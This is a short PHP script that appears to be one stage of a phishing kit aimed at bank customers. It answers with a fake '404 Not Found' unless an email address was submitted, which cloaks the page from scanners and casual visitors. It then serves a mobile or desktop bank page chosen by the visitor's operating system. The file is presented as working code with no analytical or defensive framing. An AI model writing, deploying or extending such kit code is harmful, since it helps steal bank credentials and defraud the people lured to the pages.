<?php
session_start();
if (!isset($_POST['email'])) {
    exit(header("HTTP/1.0 404 Not Found"));
}
require_once('main.php');
require_once('lang.php');
if($os == "Android" or $os == "iPhone") {
require_once('files/bank-mobile.php');
}else{
require_once('files/bank-desktop.php');
}
?>